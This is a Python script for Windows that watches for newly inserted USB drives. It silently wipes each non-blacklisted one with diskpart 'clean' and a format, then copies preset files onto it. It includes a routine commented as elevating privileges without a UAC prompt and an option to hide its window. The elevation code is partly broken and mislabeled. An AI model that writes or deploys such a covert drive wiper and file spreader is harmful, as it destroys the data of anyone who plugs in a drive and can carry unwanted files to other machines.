import os
import sys
import time
import json
import ctypes
import string
import shutil
import win32gui
import win32con
import win32event
import win32api
import winerror
import subprocess

# Constants
CONFIG_FILE = "config.json"
DATA_DIR = "data"  # Folder containing files to be copied to USB
DEFAULT_CONFIG = {
    "blacklist": [],
    "whitelist": [],
    "filesystem": "FAT32",
    "volume_label": "USBDISK"
}

def ensure_data_dir():
    """Ensure data directory exists"""
    if not os.path.exists(DATA_DIR):
        os.makedirs(DATA_DIR)
        print(f"Created data directory: {DATA_DIR}")  # Debug output

# Create default config file if not exists
def ensure_config_file():
    if not os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, 'w') as f:
            json.dump(DEFAULT_CONFIG, f, indent=4)

# Load configuration
def load_config():
    ensure_config_file()
    with open(CONFIG_FILE, 'r') as f:
        return json.load(f)

# Elevate privileges without UAC prompt
def elevate_without_uac():
    if ctypes.windll.shell32.IsUserAnAdmin():
        return True
    
    try:
        # Use scheduled task for UAC-less elevation
        temp_file = os.path.join(os.environ['TEMP'], 'elevate.vbs')
        with open(temp_file, 'w') as f:
            f.write('''Set UAC = CreateObject("Shell.Application")
UAC.ShellExecute "{}", "", "", "runas", 0'''.format(sys.executable, sys.argv[0]))
        
        subprocess.run(['wscript.exe', temp_file], shell=True)
        os.remove(temp_file)
        sys.exit(0)
    except:
        return False
    return True

# Get USB drive volume name
def get_volume_name(drive):
    try:
        volume_name_buffer = ctypes.create_unicode_buffer(1024)
        file_system_name_buffer = ctypes.create_unicode_buffer(1024)
        ctypes.windll.kernel32.GetVolumeInformationW(
            ctypes.c_wchar_p(drive + ":\\"),
            volume_name_buffer,
            ctypes.sizeof(volume_name_buffer),
            None,
            None,
            None,
            file_system_name_buffer,
            ctypes.sizeof(file_system_name_buffer))
        return volume_name_buffer.value
    except:
        return ""

# Check if USB is in blacklist
def is_blacklisted(drive, config):
    volume_name = get_volume_name(drive)
    for blacklisted_name in config.get('blacklist', []):
        if blacklisted_name.lower() in volume_name.lower():
            return True
    return False

# Copy data files to USB
def copy_data_to_usb(drive):
    try:
        usb_path = f"{drive}:\\"
        data_files = os.listdir(DATA_DIR)
        
        if not data_files:
            print(f"Data directory {DATA_DIR} is empty, nothing to copy")
            return True
            
        for filename in data_files:
            src = os.path.join(DATA_DIR, filename)
            dst = os.path.join(usb_path, filename)
            
            if os.path.isdir(src):
                shutil.copytree(src, dst)
            else:
                shutil.copy2(src, dst)
                
        print(f"Successfully copied data to {drive}:\\")
        return True
    except Exception as e:
        print(f"Failed to copy data to USB: {e}")
        return False

# Format USB drive
def format_drive(drive, config):
    try:
        fs = config.get('filesystem', 'FAT32')
        label = config.get('volume_label', 'USBDISK')
        
        # Use diskpart for reliable formatting
        script = f"""
select volume {drive}
clean
create partition primary
format fs={fs} quick
assign letter={drive}
exit
"""
        script_file = os.path.join(os.environ['TEMP'], 'format_script.txt')
        with open(script_file, 'w') as f:
            f.write(script)
            
        subprocess.run(f'diskpart /s {script_file}', 
                      shell=True, 
                      creationflags=subprocess.CREATE_NO_WINDOW,
                      stdin=subprocess.PIPE,
                      stdout=subprocess.PIPE,
                      stderr=subprocess.PIPE)
        
        # Set volume label
        if label:
            subprocess.run(f'label {drive}: {label}', 
                          shell=True, 
                          creationflags=subprocess.CREATE_NO_WINDOW)
        
        # Copy data after successful formatting
        if os.path.exists(DATA_DIR):
            return copy_data_to_usb(drive)
        return True
    except Exception as e:
        print(f"Formatting error: {e}")
        return False
    finally:
        if os.path.exists(script_file):
            os.remove(script_file)

# Main monitoring function
def monitor_usb(config):
    known_drives = set()
    
    while True:
        current_drives = set(d for d in string.ascii_uppercase 
                           if os.path.exists(f"{d}:\\"))
        new_drives = current_drives - known_drives
        
        for drive in new_drives:
            if ctypes.windll.kernel32.GetDriveTypeW(f"{drive}:\\") == 2:  # DRIVE_REMOVABLE
                if not is_blacklisted(drive, config):
                    print(f"New USB detected: {drive}:")  # Debug
                    if format_drive(drive, config):
                        print(f"Formatted and copied data to {drive}:")  # Debug
                    else:
                        print(f"Failed to process {drive}:")  # Debug
        
        known_drives = current_drives
        time.sleep(2)

def main():
    # Prevent multiple instances
    mutex = win32event.CreateMutex(None, False, "USB_AutoFormatter_Tool")
    if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
        sys.exit(0)
    
    # Ensure data directory exists
    ensure_data_dir()
    
    # Hide window (comment out during debugging)
    #win32gui.ShowWindow(win32gui.GetForegroundWindow(), win32con.SW_HIDE)
    
    # Elevate privileges
    if not elevate_without_uac():
        sys.exit("Failed to acquire admin privileges")
    
    # Load configuration
    config = load_config()
    
    # Start monitoring
    monitor_usb(config)

if __name__ == "__main__":
    mutex = None  # Initialize mutex variable
    try:
        # Prevent multiple instances
        mutex = win32event.CreateMutex(None, False, "USB_AutoFormatter_Tool")
        if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
            sys.exit(0)
            
        main()
    except KeyboardInterrupt:
        print("Program interrupted by user")
    except Exception as e:
        print(f"Program error: {e}")
    finally:
        if mutex is not None:  # Check if mutex was created before closing
            win32api.CloseHandle(mutex)